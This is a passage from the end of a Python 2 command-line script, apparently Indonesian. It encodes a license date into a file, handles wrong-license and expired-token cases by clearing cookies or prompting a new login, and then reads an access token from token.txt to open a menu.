                                        thn = thn + 1
                                        tgls = str(thn) + ' ' + str(bln) + ' ' + str(day)
                                    data64 = base64.b64encode(tgls)
                                    data32w = base64.b32encode(data64)
                                    if 'A' in dec64:
                                        tul.write('A+ZZ' + data32w + '|')
                                    else:
                                        tul.write('A+ZZ' + data32w)
                                print a + '\n [!]' + p + ' Run the tools again!\n'
                                exit()
                            else:
                                print lisen_salah
                                hapus_cokie()
                        except KeyboardInterrupt:
                            print lisen_salah
                            hapus_cokie()

                    except KeyboardInterrupt:
                        hapus_cokie()
                        keluar()

            else:
                keluar()

    except KeyboardInterrupt:
        keluar()
    except KeyError:
        print m + '\n [!] Expired Token...\n     Please Login Back! '
        login()


if __name__ == '__main__':
    import time, re, requests, sys, random, subprocess, datetime
    from bs4 import BeautifulSoup
    from concurrent.futures import ThreadPoolExecutor
    from threading import Thread
    import datetime
    from datetime import date
    cek_token()
    token = open('token.txt', 'r').read()
    __menu__(token)